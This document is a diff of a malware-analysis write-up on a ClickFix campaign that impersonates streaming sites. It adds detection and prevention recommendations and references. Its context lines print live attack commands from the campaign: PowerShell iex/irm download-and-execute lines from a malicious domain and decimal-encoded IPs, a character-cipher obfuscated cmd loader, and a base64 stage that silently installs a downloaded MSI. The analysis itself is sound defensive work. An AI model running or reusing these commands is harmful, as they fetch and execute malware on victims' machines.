@@ -431,7 +431,6 @@ iex(irm 'https://imagedrah\.com/cloudflare/f914a2d3d4dea0e5' -UserAgent 'WUA/b72
 powershell -ExecutionPolicy Bypass "irm 1450003207/1451 -OutFile $env:temp\1451.ps1 -UseBasicParsing;& $env:temp\1451.ps1" IP **86.109.75.7**
 
 cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P& set Text=.& (for %t in (6 24 44 10 51 20 14 28 32 1 44 8 30 1 58 26 37 45 18 44 10 51 20 14 28 32 1 60 28 32 26 40 8 3 26 38 38 44 17 12 27 36 44 53 28 32 26 40 1 3 26 38 38 27 26 50 26 48 25 20 28 53 48 25 32 48 3 48 25 26 20 29 48 5 32 15 23 52 6 52 52 0 52 15 38 52 41 46 52 14 42 52 22 52 21 56 52 16 56 15 56 52 47 1 52 54 56 15 30 52 41 36 52 9 52 52 30 52 47 31 52 35 52 52 59 52 47 43 52 7 42 52 45 52 47 43 52 7 32 52 12 52 6 4 52 7 32 52 49 52 47 7 52 9 52 52 58 52 43 4 52 14 56 15 36 52 43 5 52 54 56 15 1 52 41 31 52 9 52 15 12 52 6 46 52 33 56 15 49 52 41 23 52 13 32 15 58 52 11 7 52 54 56 15 38 52 11 42 52 34 56 15 57 52 6 52 52 2 32 15 53 52 6 52 52 14 56 52 55 52 41 36 52 29 32 15 53 52 6 52 52 2 32 15 50 52 41 46 52 9 52 15 35 52 21 7 52 8 56 15 0 52 43 46 52 31 32 15 31 52 43 43 52 16 52 15 7 52 21 52 52 39 56 15 8 52 21 31 52 31 32 15 21 52 21 9 52 60 56 52 50 52 52 19 19) do set Text=!Text!!Note:~%t,1!) & set Text=!Text:@= !& call !Text:~1!"
-
 ```
 
 The most interesting command is last one which is an obfuscated cmdline that hides a PowerShell download-and-execute command behind a character-substitution cipher.
@@ -454,7 +453,7 @@ set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P
 6 24 44 10 51 20 14 28 32 1 ...
 ```
 For every number `%t`, CMD executes:
-```
+```powershell
 !Note:~%t,1!
 ```
 
@@ -469,7 +468,7 @@ set Text=!Text:@= !
 ```
 
 Finally, removes the first character `.` and executes the reconstructed command. `.` was used as a placeholder.
-```
+```powershell
 call !Text:~1!
 ```
 
@@ -477,14 +476,12 @@ call !Text:~1!
 The 2nd stage contains a base64 encoded command:
 ```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc YwBkACAAJABlAG4AdgA6AFQATQBQADsAaQByAG0AIAAyADUANAA5ADEAMgA3ADEAMwA1AC8AMwAzADMAIAAtAE8AdQB0AEYAaQBsAGUAIAB1AC4AbQBzAGkAOwBtAHMAaQBlAHgAZQBjACAALwBpACAAdQAuAG0AcwBpACAALwBxAG4AIABNAFMASQBJAE4AUwBUAEEATABMAFAARQBSAFUAUwBFAFIAPQAxAA==
-
 ```
 After decoding the command, the command downloading `u.msi` file from the IP 2549127135
 which can be converted to dotted decimal format to 151\.240\.151\.223.
 
 ```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h cd $env:TMP;irm 2549127135/333 -OutFile u.msi;msiexec /i u.msi /qn MSIINSTALLPERUSER=1
-
 ```
 
 Obfuscated CMD → Character-index reconstruction → String replacement → Second-stage command  → MSI download → C2 communication
@@ -573,3 +570,26 @@ The lists of IOCs (Domains, IPs, and body of pages) are in my [github](https://g
 | `fb3b51251459108f3337d7ae3e5fad105d35a8956ae05d333b8f128afc451a31` | Extracted [Executable](https://app.any.run/tasks/43a11b7e-d8b9-49b4-8408-02643568f94c/) (`3e1LfPE3k6BR4EZ-ptYKZRR30rMPonL.exe`) |
 | `268ae71bdcefaaa418cb42efcf0f6a3b828e233eca3cb55faa666058d9e6651b` | Dropped Executable (`update-KB4703886.exe`)                                                                                     |
 | `de958b6195ea807ae674b522a907be91331c4d12e564e3a8e8d86d8db64d33cd` | MSI (`u.msi`)                                                                                                                   |
+# Recommendations
+## Detection
+Hunt for the PowerShell behaviors associated with this campaign using the [Sigma rules](https://github.com/muha2xmad/Sigma-Rules/tree/main/PS%20streaming%20ClickFix%20%20campaign) referenced in the repository.
+
+## Prevention
+In business environments
+- **Block domains by category** at the proxy/web gateway — specifically:
+    - **Entertainment/streaming** categories (the ClickFix lures impersonate streaming sites)
+    - **Newly registered domains** many campaign domains are newly registered
+- **Restrict PowerShell** for standard users
+- **Block outbound traffic to raw IPs**
+- Awareness campaign for the users
+
+
+
+
+
+# References
+- https://github.com/muha2xmad/Sigma-Rules/tree/main/PS%20streaming%20ClickFix%20%20campaign
+
+- https://app.any.run/tasks/43a11b7e-d8b9-49b4-8408-02643568f94c/
+
+- https://github.com/muha2xmad/IOCs/tree/main/arabic%20streaming%20clickfix%20campaign
